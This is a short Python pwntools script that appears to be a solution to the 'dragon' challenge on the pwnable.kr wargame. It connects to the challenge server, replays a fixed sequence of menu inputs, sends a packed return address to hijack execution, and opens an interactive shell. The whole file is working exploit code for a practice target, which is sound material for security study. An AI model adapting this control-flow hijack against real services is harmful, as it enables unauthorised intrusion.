#!/usr/bin/python
# -*- coding: utf-8 -*-
# @arthurpaixao
from pwn import *

# sh = process('/home/c/ctf/dragon')

sh=remote('pwnable.kr',9004)
[sh.sendline('1') for i in range(4)]
[sh.sendline('3\n3\n2') for i in range(4)]
sh.sendline(p32(0x08048DBF))
sh.interactive()
